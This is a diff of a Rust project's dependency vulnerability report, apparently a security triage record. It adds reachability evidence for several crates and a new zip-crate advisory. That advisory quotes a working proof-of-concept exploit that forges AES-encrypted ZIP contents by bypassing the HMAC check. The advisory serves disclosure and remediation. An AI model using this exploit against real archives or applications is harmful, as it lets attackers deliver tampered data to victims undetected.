@@ -36,7 +36,7 @@
       "decision": "warn",
       "mitigation": "No common authoritative safe version; unresolved advisories: RUSTSEC-2016-0005, RUSTSEC-2022-0011",
       "reason_codes": [
-        "non_blocking_severity"
+        "proven_unreachable"
       ],
       "risk_acceptance": ""
     },
@@ -68,15 +68,63 @@
       "decision": "warn",
       "mitigation": "No common authoritative safe version; unresolved advisories: RUSTSEC-2020-0071",
       "reason_codes": [
-        "non_blocking_severity"
+        "proven_unreachable"
       ],
       "risk_acceptance": ""
     },
     {
       "decision": "warn",
-      "mitigation": "No common authoritative safe version; unresolved advisories: RUSTSEC-2020-0071",
+      "mitigation": "No common authoritative safe version; unresolved advisories: GHSA-8HXF-QR8P-62X4, GHSA-9HJ8-73FH-9963, GHSA-M665-V7PM-7GRJ, RUSTSEC-2026-0367, RUSTSEC-2026-0368, RUSTSEC-2026-0369, RUSTSEC-2026-0429",
       "reason_codes": [
-        "non_blocking_severity"
+        "proven_unreachable"
+      ],
+      "risk_acceptance": ""
+    },
+    {
+      "decision": "warn",
+      "mitigation": "No common authoritative safe version; unresolved advisories: GHSA-8HXF-QR8P-62X4, GHSA-9HJ8-73FH-9963, GHSA-M665-V7PM-7GRJ, RUSTSEC-2026-0367, RUSTSEC-2026-0368, RUSTSEC-2026-0369, RUSTSEC-2026-0429",
+      "reason_codes": [
+        "proven_unreachable"
+      ],
+      "risk_acceptance": ""
+    },
+    {
+      "decision": "warn",
+      "mitigation": "No common authoritative safe version; unresolved advisories: GHSA-8HXF-QR8P-62X4, GHSA-9HJ8-73FH-9963, GHSA-M665-V7PM-7GRJ, RUSTSEC-2026-0367, RUSTSEC-2026-0368, RUSTSEC-2026-0369, RUSTSEC-2026-0429",
+      "reason_codes": [
+        "proven_unreachable"
+      ],
+      "risk_acceptance": ""
+    },
+    {
+      "decision": "warn",
+      "mitigation": "No common authoritative safe version; unresolved advisories: GHSA-8HXF-QR8P-62X4, GHSA-9HJ8-73FH-9963, GHSA-M665-V7PM-7GRJ, RUSTSEC-2026-0367, RUSTSEC-2026-0368, RUSTSEC-2026-0369, RUSTSEC-2026-0429",
+      "reason_codes": [
+        "proven_unreachable"
+      ],
+      "risk_acceptance": ""
+    },
+    {
+      "decision": "warn",
+      "mitigation": "No common authoritative safe version; unresolved advisories: GHSA-8HXF-QR8P-62X4, GHSA-9HJ8-73FH-9963, GHSA-M665-V7PM-7GRJ, RUSTSEC-2026-0367, RUSTSEC-2026-0368, RUSTSEC-2026-0369, RUSTSEC-2026-0429",
+      "reason_codes": [
+        "proven_unreachable"
+      ],
+      "risk_acceptance": ""
+    },
+    {
+      "decision": "warn",
+      "mitigation": "No common authoritative safe version; unresolved advisories: GHSA-8HXF-QR8P-62X4, GHSA-9HJ8-73FH-9963, GHSA-M665-V7PM-7GRJ, RUSTSEC-2026-0367, RUSTSEC-2026-0368, RUSTSEC-2026-0369, RUSTSEC-2026-0429",
+      "reason_codes": [
+        "proven_unreachable"
+      ],
+      "risk_acceptance": ""
+    },
+    {
+      "decision": "warn",
+      "mitigation": "No common authoritative safe version; unresolved advisories: GHSA-8HXF-QR8P-62X4, GHSA-9HJ8-73FH-9963, GHSA-M665-V7PM-7GRJ, RUSTSEC-2026-0367, RUSTSEC-2026-0368, RUSTSEC-2026-0369, RUSTSEC-2026-0429",
+      "reason_codes": [
+        "proven_unreachable"
       ],
       "risk_acceptance": ""
     }
@@ -90,7 +138,7 @@
             "ecosystem": "crates.io",
             "fixed_versions": [],
             "name": "atomic-polyfill",
-            "purl": "pkg:cargo/atomic-polyfill",
+            "purl": "pkg:cargo/atomic-polyfill@1.0.3",
             "ranges": [
               {
                 "events": [
@@ -134,8 +182,10 @@
         "scope": "unknown",
         "version": "1.0.3"
       },
-      "reachability": "not_assessed",
-      "reachability_evidence": []
+      "reachability": "unreachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#locked-not-built (cargo tree --target all --all-features -e all prints nothing)"
+      ]
     },
     {
       "advisory": {
@@ -144,7 +194,7 @@
             "ecosystem": "crates.io",
             "fixed_versions": [],
             "name": "derivative",
-            "purl": "pkg:cargo/derivative",
+            "purl": "pkg:cargo/derivative@2.2.0",
             "ranges": [
               {
                 "events": [
@@ -188,8 +238,10 @@
         "scope": "unknown",
         "version": "2.2.0"
       },
-      "reachability": "not_assessed",
-      "reachability_evidence": []
+      "reachability": "unreachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#build-time-only (proc-macro; runs inside rustc, not linked)"
+      ]
     },
     {
       "advisory": {
@@ -198,7 +250,7 @@
             "ecosystem": "crates.io",
             "fixed_versions": [],
             "name": "fxhash",
-            "purl": "pkg:cargo/fxhash",
+            "purl": "pkg:cargo/fxhash@0.2.1",
             "ranges": [
               {
                 "events": [
@@ -242,8 +294,10 @@
         "scope": "unknown",
         "version": "0.2.1"
       },
-      "reachability": "not_assessed",
-      "reachability_evidence": []
+      "reachability": "reachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#fxhash-reachable (scraper -> selectors in src/sources/advisories.rs and src/sources/tracks/hartford.rs)"
+      ]
     },
     {
       "advisory": {
@@ -252,7 +306,7 @@
             "ecosystem": "crates.io",
             "fixed_versions": [],
             "name": "gcc",
-            "purl": "pkg:cargo/gcc",
+            "purl": "pkg:cargo/gcc@0.3.55",
             "ranges": [
               {
                 "events": [
@@ -295,8 +349,10 @@
         "scope": "unknown",
         "version": "0.3.55"
       },
-      "reachability": "not_assessed",
-      "reachability_evidence": []
+      "reachability": "unreachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#build-time-only (build-dependency of rust-crypto only; cargo tree -e normal prints nothing)"
+      ]
     },
     {
       "advisory": {
@@ -307,7 +363,7 @@
               "0.2.37-0"
             ],
             "name": "rust-crypto",
-            "purl": "pkg:cargo/rust-crypto",
+            "purl": "pkg:cargo/rust-crypto@0.2.36",
             "ranges": [
               {
                 "events": [
@@ -358,8 +414,10 @@
         "scope": "unknown",
         "version": "0.2.36"
       },
-      "reachability": "not_assessed",
-      "reachability_evidence": []
+      "reachability": "unreachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#rust-crypto-unreferenced (no crypto:: reference in amtrak-gtfs-rt f3a83db0 or this crate; zero crypto/rust_crypto_util symbols in the release binary)"
+      ]
     },
     {
       "advisory": {
@@ -368,7 +426,7 @@
             "ecosystem": "crates.io",
             "fixed_versions": [],
             "name": "rust-crypto",
-            "purl": "pkg:cargo/rust-crypto",
+            "purl": "pkg:cargo/rust-crypto@0.2.36",
             "ranges": [
               {
                 "events": [
@@ -391,7 +449,7 @@
             "ecosystem": "crates.io",
             "fixed_versions": [],
             "name": "rust-crypto",
-            "purl": "pkg:cargo/rust-crypto",
+            "purl": "pkg:cargo/rust-crypto@0.2.36",
             "ranges": [
               {
                 "events": [
@@ -451,8 +509,10 @@
         "scope": "unknown",
         "version": "0.2.36"
       },
-      "reachability": "not_assessed",
-      "reachability_evidence": []
+      "reachability": "unreachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#rust-crypto-unreferenced (Amtrak decryption is amtk with RustCrypto aes/block-modes/pbkdf2; zero rust-crypto symbols in the release binary)"
+      ]
     },
     {
       "advisory": {
@@ -461,7 +521,7 @@
             "ecosystem": "crates.io",
             "fixed_versions": [],
             "name": "rustc-serialize",
-            "purl": "pkg:cargo/rustc-serialize",
+            "purl": "pkg:cargo/rustc-serialize@0.3.25",
             "ranges": [
               {
                 "events": [
@@ -518,8 +578,10 @@
         "scope": "unknown",
         "version": "0.3.25"
       },
-      "reachability": "not_assessed",
-      "reachability_evidence": []
+      "reachability": "unreachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#rust-crypto-unreferenced (only dependent is unreferenced rust-crypto; zero rustc_serialize symbols in the release binary)"
+      ]
     },
     {
       "advisory": {
@@ -528,7 +590,7 @@
             "ecosystem": "crates.io",
             "fixed_versions": [],
             "name": "rustc-serialize",
-            "purl": "pkg:cargo/rustc-serialize",
+            "purl": "pkg:cargo/rustc-serialize@0.3.25",
             "ranges": [
               {
                 "events": [
@@ -572,12 +634,64 @@
         "scope": "unknown",
         "version": "0.3.25"
       },
-      "reachability": "not_assessed",
-      "reachability_evidence": []
+      "reachability": "unreachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#rust-crypto-unreferenced (only dependent is unreferenced rust-crypto; zero rustc_serialize symbols in the release binary)"
+      ]
     },
     {
       "advisory": {
         "affected_packages": [
+          {
+            "ecosystem": "crates.io",
+            "fixed_versions": [
+              "0.2.23"
+            ],
+            "name": "time",
+            "purl": "pkg:cargo/time@0.1.45",
+            "ranges": [
+              {
+                "events": [
+                  {
+                    "kind": "introduced",
+                    "value": "0.1.0"
+                  },
+                  {
+                    "kind": "fixed",
+                    "value": "0.2.23"
+                  }
+                ],
+                "repo": null,
+                "type": "SEMVER"
+              }
+            ],
+            "versions": []
+          },
+          {
+            "ecosystem": "crates.io",
+            "fixed_versions": [
+              "0.2.23"
+            ],
+            "name": "time",
+            "purl": "pkg:cargo/time@0.1.45",
+            "ranges": [
+              {
+                "events": [
+                  {
+                    "kind": "introduced",
+                    "value": "0.2.7"
+                  },
+                  {
+                    "kind": "fixed",
+                    "value": "0.2.23"
+                  }
+                ],
+                "repo": null,
+                "type": "SEMVER"
+              }
+            ],
+            "versions": []
+          },
           {
             "ecosystem": "crates.io",
             "fixed_versions": [
@@ -591,7 +705,7 @@
               "0.2.6"
             ],
             "name": "time",
-            "purl": "pkg:cargo/time",
+            "purl": "pkg:cargo/time@0.1.45",
             "ranges": [
               {
                 "events": [
@@ -665,56 +779,6 @@
               }
             ],
             "versions": []
-          },
-          {
-            "ecosystem": "crates.io",
-            "fixed_versions": [
-              "0.2.23"
-            ],
-            "name": "time",
-            "purl": "pkg:cargo/time",
-            "ranges": [
-              {
-                "events": [
-                  {
-                    "kind": "introduced",
-                    "value": "0.2.7"
-                  },
-                  {
-                    "kind": "fixed",
-                    "value": "0.2.23"
-                  }
-                ],
-                "repo": null,
-                "type": "SEMVER"
-              }
-            ],
-            "versions": []
-          },
-          {
-            "ecosystem": "crates.io",
-            "fixed_versions": [
-              "0.2.23"
-            ],
-            "name": "time",
-            "purl": "pkg:cargo/time",
-            "ranges": [
-              {
-                "events": [
-                  {
-                    "kind": "introduced",
-                    "value": "0.1.0"
-                  },
-                  {
-                    "kind": "fixed",
-                    "value": "0.2.23"
-                  }
-                ],
-                "repo": null,
-                "type": "SEMVER"
-              }
-            ],
-            "versions": []
           }
         ],
         "affected_ranges": [
@@ -753,8 +817,8 @@
             ],
             "details": "### Impact\n\nUnix-like operating systems may segfault due to dereferencing a dangling pointer in specific circumstances. This requires an environment variable to be set in a different thread than the affected functions. This may occur without the user's knowledge, notably in a third-party library.\n\nThe affected functions from time 0.2.7 through 0.2.22 are:\n\n- `time::UtcOffset::local_offset_at`\n- `time::UtcOffset::try_local_offset_at`\n- `time::UtcOffset::current_local_offset`\n- `time::UtcOffset::try_current_local_offset`\n- `time::OffsetDateTime::now_local`\n- `time::OffsetDateTime::try_now_local`\n\nThe affected functions in time 0.1 (all versions) are:\n\n- `at`\n- `at_utc`\n- `now`\n\nNon-Unix targets (including Windows and wasm) are unaffected.\n\n### Patches\n\nIn some versions of `time`, the internal method that determines the local offset has been modified to always return `None` on the affected operating systems. This has the effect of returning an `Err` on the `try_*` methods and `UTC` on the non-`try_*` methods. In later versions, `time` will attempt to determine the number of threads running in the process. If the process is single-threaded, the call will proceed as its safety invariant is upheld.\n\nUsers and library authors with time in their dependency tree must perform `cargo update`, which will pull in the updated, unaffected code.\n\nUsers of time 0.1 do not have a patch and must upgrade to an unaffected version: time 0.2.23 or greater or the 0.3 series.\n\n### Workarounds\n\nLibrary authors must ensure that the program only has one running thread at the time of calling any affected method. Binary authors may do the same and/or ensure that no other thread is actively mutating the environment.\n\n### References\n\n[time-rs/time#293](https://github.com/time-rs/time/issues/293).",
             "epss_scores": [
-              0.01622,
-              0.73572
+              0.01965,
+              0.80029
             ],
             "severity": "medium",
             "source": "github",
@@ -800,7 +864,7 @@
           "0.2.6"
         ],
         "id": "RUSTSEC-2020-0071",
-        "modified": "2026-03-13T22:01:10.372513Z",
+        "modified": "2026-09-10T03:49:08.359875406Z",
         "references": [
           "https://crates.io/crates/time",
           "https://crates.io/crates/time/0.2.23",
@@ -825,8 +889,10 @@
         "scope": "unknown",
         "version": "0.1.45"
       },
-      "reachability": "not_assessed",
-      "reachability_evidence": []
+      "reachability": "unreachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#rust-crypto-unreferenced (only dependent is unreferenced rust-crypto; the service never calls set_var/remove_var)"
+      ]
     },
     {
       "advisory": {
@@ -834,133 +900,20 @@
           {
             "ecosystem": "crates.io",
             "fixed_versions": [
-              "0.2.0",
-              "0.2.1",
-              "0.2.2",
-              "0.2.23",
-              "0.2.3",
-              "0.2.4",
-              "0.2.5",
-              "0.2.6"
+              "9.0.0"
             ],
-            "name": "time",
-            "purl": "pkg:cargo/time",
+            "name": "zip",
+            "purl": "pkg:cargo/zip@6.0.0",
             "ranges": [
               {
                 "events": [
                   {
                     "kind": "introduced",
-                    "value": "0.0.0-0"
+                    "value": "0.6.0"
                   },
                   {
                     "kind": "fixed",
-                    "value": "0.2.0"
-                  },
-                  {
-                    "kind": "introduced",
-                    "value": "0.2.1-0"
-                  },
-                  {
-                    "kind": "fixed",
-                    "value": "0.2.1"
-                  },
-                  {
-                    "kind": "introduced",
-                    "value": "0.2.2-0"
-                  },
-                  {
-                    "kind": "fixed",
-                    "value": "0.2.2"
-                  },
-                  {
-                    "kind": "introduced",
-                    "value": "0.2.3-0"
-                  },
-                  {
-                    "kind": "fixed",
-                    "value": "0.2.3"
-                  },
-                  {
-                    "kind": "introduced",
-                    "value": "0.2.4-0"
-                  },
-                  {
-                    "kind": "fixed",
-                    "value": "0.2.4"
-                  },
-                  {
-                    "kind": "introduced",
-                    "value": "0.2.5-0"
-                  },
-                  {
-                    "kind": "fixed",
-                    "value": "0.2.5"
-                  },
-                  {
-                    "kind": "introduced",
-                    "value": "0.2.6-0"
-                  },
-                  {
-                    "kind": "fixed",
-                    "value": "0.2.6"
-                  },
-                  {
-                    "kind": "introduced",
-                    "value": "0.2.7-0"
-                  },
-                  {
-                    "kind": "fixed",
-                    "value": "0.2.23"
-                  }
-                ],
-                "repo": null,
-                "type": "SEMVER"
-              }
-            ],
-            "versions": []
-          },
-          {
-            "ecosystem": "crates.io",
-            "fixed_versions": [
-              "0.2.23"
-            ],
-            "name": "time",
-            "purl": "pkg:cargo/time",
-            "ranges": [
-              {
-                "events": [
-                  {
-                    "kind": "introduced",
-                    "value": "0.2.7"
-                  },
-                  {
-                    "kind": "fixed",
-                    "value": "0.2.23"
-                  }
-                ],
-                "repo": null,
-                "type": "SEMVER"
-              }
-            ],
-            "versions": []
-          },
-          {
-            "ecosystem": "crates.io",
-            "fixed_versions": [
-              "0.2.23"
-            ],
-            "name": "time",
-            "purl": "pkg:cargo/time",
-            "ranges": [
-              {
-                "events": [
-                  {
-                    "kind": "introduced",
-                    "value": "0.1.0"
-                  },
-                  {
-                    "kind": "fixed",
-                    "value": "0.2.23"
+                    "value": "9.0.0"
                   }
                 ],
                 "repo": null,
@@ -971,43 +924,25 @@
           }
         ],
         "affected_ranges": [
-          "fixed:0.2.0",
-          "fixed:0.2.1",
-          "fixed:0.2.2",
-          "fixed:0.2.23",
-          "fixed:0.2.3",
-          "fixed:0.2.4",
-          "fixed:0.2.5",
-          "fixed:0.2.6",
-          "introduced:0.0.0-0",
-          "introduced:0.1.0",
-          "introduced:0.2.1-0",
-          "introduced:0.2.2-0",
-          "introduced:0.2.3-0",
-          "introduced:0.2.4-0",
-          "introduced:0.2.5-0",
-          "introduced:0.2.6-0",
-          "introduced:0.2.7",
-          "introduced:0.2.7-0"
+          "fixed:9.0.0",
+          "introduced:0.6.0"
         ],
         "aliases": [
-          "CVE-2020-26235",
-          "GHSA-WCG3-CVX6-7396",
-          "TIME-RS"
+          "CVE-2026-115906"
         ],
-        "details": "### Impact\n\nThe affected functions set environment variables without synchronization. On Unix-like operating systems, this can crash in multithreaded programs. Programs may segfault due to dereferencing a dangling pointer if an environment variable is read in a different thread than the affected functions. This may occur without the user's knowledge, notably in the Rust standard library or third-party libraries.\n\nThe affected functions from time 0.2.7 through 0.2.22 are:\n\n- `time::UtcOffset::local_offset_at`\n- `time::UtcOffset::try_local_offset_at`\n- `time::UtcOffset::current_local_offset`\n- `time::UtcOffset::try_current_local_offset`\n- `time::OffsetDateTime::now_local`\n- `time::OffsetDateTime::try_now_local`\n\nThe affected functions in time 0.1 (all versions) are:\n\n- `time::at_utc`\n- `time::at`\n- `time::now`\n- `time::tzset`\n\nNon-Unix targets (including Windows and wasm) are unaffected.\n\n### Patches\n\nPending a proper fix, the internal method that determines the local offset has been modified to always return `None` on the affected operating systems. This has the effect of returning an `Err` on the `try_*` methods and `UTC` on the non-`try_*` methods.\n\nUsers and library authors with time in their dependency tree should perform `cargo update`, which will pull in the updated, unaffected code.\n\nUsers of time 0.1 do not have a patch and should upgrade to an unaffected version: time 0.2.23 or greater or the 0.3 series.\n\n### Workarounds\n\nA possible workaround for crates affected through the transitive dependency in `chrono`, is to avoid using the default `oldtime` feature dependency of the `chrono` crate by disabling its `default-features` and manually specifying the required features instead.\n\n#### Examples:\n\n`Cargo.toml`:  \n\n```toml\nchrono = { version = \"0.4\", default-features = false, features = [\"serde\"] }\n```\n\n```toml\nchrono = { version = \"0.4.22\", default-features = false, features = [\"clock\"] }\n```\n\nCommandline:  \n\n```bash\ncargo add chrono --no-default-features -F clock\n```\n\nSources:  \n - [chronotope/chrono#602 (comment)](https://github.com/chronotope/chrono/issues/602#issuecomment-1242149249)  \n - [vityafx/serde-aux#21](https://github.com/vityafx/serde-aux/issues/21)",
+        "details": "### Summary\n\nAn AES-encrypted (AE-x) entry's authentication code is verified only when the reader's byte counter lands exactly on zero. If the bounded entry reader reaches the archive's actual EOF before the attacker-controlled, header-declared `compressed_size`, the counter remains positive, the HMAC is never read or compared, and the truncated, unauthenticated plaintext is returned as a clean end of stream. A zero-payload entry also returns before authentication. An attacker who does not know the password can modify an archive so chosen or modified plaintext is accepted with no error.\n\n### Details\n\n[`src/aes.rs:246-292`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/aes.rs#L246-L292):\n\n```rust\nfn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {\n    if self.data_remaining == 0 { // @audit insufficient check\n        return Ok(0);\n    }\n\n    // get the number of bytes to read, compare as u64 to make sure we can read more than\n    // 2^32 bytes even on 32 bit systems.\n    let bytes_to_read = self.data_remaining.min(buf.len() as u64) as usize;\n    let read = self.reader.read(&mut buf[0..bytes_to_read])?;\n    self.data_remaining -= read as u64;\n\n    // Update the hmac with the encrypted data\n    self.hmac.update(&buf[0..read]);\n\n    // decrypt the data\n    self.cipher.crypt_in_place(&mut buf[0..read]);\n\n    // if there is no data left to read, check the integrity of the data\n    if self.data_remaining == 0 {\n        debug_assert!(\n            !self.finalized,\n            \"Tried to use an already finalized HMAC. This is a bug!\"\n        );\n        if self.finalized {\n            return Err(Error::new(\n                ErrorKind::InvalidData,\n                \"Tried to use an already finalized HMAC\",\n            ));\n        }\n        self.finalized = true;\n\n        // Zip uses HMAC-Sha1-80, which only uses the first half of the hash\n        // see https://www.winzip.com/win/en/aes_info.html#auth-faq\n        let mut read_auth_code = [0; AUTH_CODE_LENGTH];\n        self.reader.read_exact(&mut read_auth_code)?;\n        let computed_auth_code = &self.hmac.finalize_reset().into_bytes()[0..AUTH_CODE_LENGTH];\n\n        // use constant time comparison to mitigate timing attacks\n        if !constant_time_eq(computed_auth_code, &read_auth_code) {\n            return Err(Error::new(\n                ErrorKind::InvalidData,\n                \"Invalid authentication code, this could be due to an invalid password or errors in the data\",\n            ));\n        }\n    }\n\n    Ok(read)\n}\n```\n\n`data_remaining` starts at `compressed_size - (2 + 10 + salt_length)` ([`src/aes.rs:144-145`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/aes.rs#L144-L145)), where `compressed_size` comes straight from the attacker-controlled central directory. Nothing cross-checks the declared data span against the archive's structural boundaries: `ZipFileData::find_content()` is just `reader.take(self.compressed_size)` ([`src/types.rs:214-223`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/types.rs#L214-L223)), and `make_crypto_reader()` passes the declared value into `AesReader::new()` ([`src/read/readers.rs`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/readers.rs#L219-L223)).\n\nWhen the entry's bounded reader reaches true EOF before the declared size, the inner reader returns `Ok(0)`, the subtraction takes away nothing, and the finalisation block — the only place the 10-byte HMAC-SHA1-80 tag is read and compared — never runs. If bytes such as the central directory follow the entry, they are consumed as payload until the `Take` limit is reached; the HMAC then usually fails. The bypass therefore requires true EOF at the premature end (as in the PoC) or the zero-payload case. The early return at the top of `read()` means an entry whose declared size leaves zero payload bytes is never authenticated either, even though its tag is present in the file.\n\nThis defeats the guarantee the type documents: *\"After the data has been read and decrypted an HMAC will be checked and provide a final means to check if either the password is invalid or if the data has been changed.\"*\n\nAE-2 entries skip the CRC-32 check by design ([`src/read/readers.rs`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/readers.rs#L248-L255) → `Crc32Reader::new(.., should_disable = true)`), so an AE-2 entry on this path has no integrity check of any kind remaining. AES-CTR is malleable, so an attacker who can modify an archive in transit — without the password — can XOR chosen plaintext onto the ciphertext and arrange for the entry to end at true EOF. The password-bearing read paths are affected, including `by_index_decrypt()`, `by_name_decrypt()`, `by_path_decrypt()`, and `by_index_with_options()` when a password is supplied. Bare `extract()` calls `by_index()` without a password and therefore rejects AES-encrypted entries; an application that decrypts entries through these APIs before writing or extracting them is affected.\n\n### PoC\n\n`tests/aes_hmac_bypass.rs` below; `Cargo.toml` needs only `zip = { git = \"https://github.com/zip-rs/zip2\", rev = \"6f09b3064ec87c3a69ea9f3413f9f9638b4aa446\" }`, or `zip = \"8.6.0\"` to run it against the published 8.6.0 release unchanged. All three tests pass in debug and release against the reviewed commit.\n\n```rust\nuse std::io::{Cursor, Read, Write};\nuse zip::write::SimpleFileOptions;\nuse zip::{AesMode, CompressionMethod, ZipArchive, ZipWriter};\n\nconst PASSWORD: [REDACTED] = \"correct horse battery staple\";\nconst GENUINE: &[u8] = b\"balance: 100 USD\\n\";\nconst FORGED: &[u8] = b\"balance: 999 USD\\n\";\nconst AES256_OVERHEAD: usize = 28; // 16-byte salt + 2-byte verifier + 10-byte tag\n\nfn genuine_archive(plaintext: &[u8]) -> Vec<u8> {\n    let mut w = ZipWriter::new(Cursor::new(Vec::new()));\n    let opts = SimpleFileOptions::default()\n        .compression_method(CompressionMethod::Stored)\n        .with_aes_encryption(AesMode::Aes256, PASSWORD);\n    w.start_file(\"secret.txt\", opts).unwrap();\n    w.write_all(plaintext).unwrap();\n    w.finish().unwrap().into_inner()\n}\n\n/// What a victim does: open with the correct password and read the entry.\nfn victim_reads(archive: &[u8]) -> std::io::Result<Vec<u8>> {\n    let mut a = ZipArchive::new(Cursor::new(archive.to_vec())).unwrap();\n    let mut f = a.by_index_decrypt(0, PASSWORD.as_bytes()).unwrap();\n    let mut out = Vec::new();\n    f.read_to_end(&mut out)?;\n    Ok(out)\n}\n\nfn u16le(b: &[u8], off: usize) -> usize {\n    u16::from_le_bytes([b[off], b[off + 1]]) as usize\n}\n\n/// Payload offset of the single local file header at offset 0.\nfn payload_start(a: &[u8]) -> usize {\n    30 + u16le(a, 26) + u16le(a, 28)\n}\n\n/// Control: on a well-formed archive the HMAC does reject forged ciphertext.\n#[test]\nfn tampering_is_detected_when_the_declared_size_is_honest() {\n    let mut a = genuine_archive(GENUINE);\n    let ct = payload_start(&a) + 18;\n    for i in 0..GENUINE.len() {\n        a[ct + i] ^= GENUINE[i] ^ FORGED[i]; // AES-CTR is malleable\n    }\n    let err = victim_reads(&a).unwrap_err();\n    assert!(err.to_string().contains(\"Invalid authentication code\"));\n}\n\n/// The bypass: chosen plaintext is delivered verbatim, without the password.\n#[test]\nfn hmac_is_bypassed_when_the_entry_ends_early() {\n    let genuine = genuine_archive(GENUINE);\n    let hdr_len = payload_start(&genuine);\n    let eocd = genuine.len() - 22; // no archive comment yet\n    let cd_offset = u32::from_le_bytes(genuine[eocd + 16..eocd + 20].try_into().unwrap()) as usize;\n\n    // Park a second copy of the entry after the end-of-central-directory record,\n    // inside the archive comment, so its data ends at true EOF. Header, salt and\n    // password verifier are copied verbatim — no password knowledge is required.\n    let mut evil = genuine.clone();\n    let new_hdr_offset = evil.len() as u32;\n    evil.extend_from_slice(&genuine[..hdr_len + 18]); // local header + salt + verifier\n    for i in 0..GENUINE.len() {\n        // XOR the keystream onto the chosen plaintext; the 10-byte tag is omitted.\n        evil.push(genuine[hdr_len + 18 + i] ^ GENUINE[i] ^ FORGED[i]);\n    }\n    let comment_len = (evil.len() - genuine.len()) as u16;\n    evil[eocd + 20..eocd + 22].copy_from_slice(&comment_len.to_le_bytes());\n\n    // Repoint the central directory at the parked copy and declare more data than\n    // is present, so `data_remaining` can never reach zero.\n    let declared = (AES256_OVERHEAD + GENUINE.len() + 64) as u32;\n    evil[cd_offset + 42..cd_offset + 46].copy_from_slice(&new_hdr_offset.to_le_bytes());\n    evil[cd_offset + 20..cd_offset + 24].copy_from_slice(&declared.to_le_bytes());\n    let hdr2 = new_hdr_offset as usize;\n    evil[hdr2 + 18..hdr2 + 22].copy_from_slice(&declared.to_le_bytes());\n\n    let content = victim_reads(&evil).expect(\"BUG: unauthenticated content was accepted\");\n    assert_eq!(content, FORGED);\n}\n\n/// Second path: an entry with no payload bytes is never authenticated at all.\n#[test]\nfn hmac_is_never_checked_for_a_zero_length_entry() {\n    let mut a = genuine_archive(b\"\");\n    let tag = payload_start(&a) + 18;\n    a[tag] ^= 0xff; // corrupt the 10-byte authentication code\n    let content = victim_reads(&a).expect(\"BUG: a corrupt authentication code was accepted\");\n    assert!(content.is_empty());\n}\n```\n\nTurning the genuine plaintext into a *chosen* plaintext needs the genuine plaintext, as always with CTR malleability; without it the attacker still controls arbitrary bit-flips in the delivered content.\n\n### Impact\n\nAny application that decrypts AES ZIP entries from untrusted or in-transit archives — backup restore, artefact and package ingestion, mail attachments, upload handling — can be served modified or attacker-chosen content by a party who does not hold the password, with no error surfaced by the affected read path. Exact chosen plaintext requires knowledge of the original plaintext, as with standard CTR malleability; otherwise the attacker can still induce arbitrary bit flips. Confidentiality is not affected and there is no memory-safety issue; the loss is the integrity guarantee that AE-x authenticated encryption exists to provide.\n\n### Suggested remediation\n\n1. In `AesReaderValid::read()`, treat a short inner read as an error rather than a clean EOF: after the decrement, if `read == 0 && self.data_remaining > 0`, return `ErrorKind::UnexpectedEof`.\n2. That alone is not enough — run the finalisation logic for zero-length entries too, either by dropping the early return and finalising once per reader, or by finalising at construction when `data_length == 0`.\n3. Defence in depth: validate that the declared compressed-data span is bounded by the archive's structural boundaries (in particular, the central-directory start when known) in `ZipFileData::find_content()` / `find_content_seek()` (`src/types.rs`). Also make the `compressed_size - overhead` subtraction in `AesReader::new()` (`src/aes.rs:144`) checked — today a declared size below the AES overhead underflows it, which panics under `overflow-checks` and, for sizes that still permit header validation, otherwise yields up to 9 bytes of unauthenticated plaintext through the same missing check.",
         "enrichments": [
           {
             "cvss_scores": [
-              6.2
+              6.5
             ],
             "cvss_vectors": [
-              "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+              "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
             ],
-            "details": "### Impact\n\nUnix-like operating systems may segfault due to dereferencing a dangling pointer in specific circumstances. This requires an environment variable to be set in a different thread than the affected functions. This may occur without the user's knowledge, notably in a third-party library.\n\nThe affected functions from time 0.2.7 through 0.2.22 are:\n\n- `time::UtcOffset::local_offset_at`\n- `time::UtcOffset::try_local_offset_at`\n- `time::UtcOffset::current_local_offset`\n- `time::UtcOffset::try_current_local_offset`\n- `time::OffsetDateTime::now_local`\n- `time::OffsetDateTime::try_now_local`\n\nThe affected functions in time 0.1 (all versions) are:\n\n- `at`\n- `at_utc`\n- `now`\n\nNon-Unix targets (including Windows and wasm) are unaffected.\n\n### Patches\n\nIn some versions of `time`, the internal method that determines the local offset has been modified to always return `None` on the affected operating systems. This has the effect of returning an `Err` on the `try_*` methods and `UTC` on the non-`try_*` methods. In later versions, `time` will attempt to determine the number of threads running in the process. If the process is single-threaded, the call will proceed as its safety invariant is upheld.\n\nUsers and library authors with time in their dependency tree must perform `cargo update`, which will pull in the updated, unaffected code.\n\nUsers of time 0.1 do not have a patch and must upgrade to an unaffected version: time 0.2.23 or greater or the 0.3 series.\n\n### Workarounds\n\nLibrary authors must ensure that the program only has one running thread at the time of calling any affected method. Binary authors may do the same and/or ensure that no other thread is actively mutating the environment.\n\n### References\n\n[time-rs/time#293](https://github.com/time-rs/time/issues/293).",
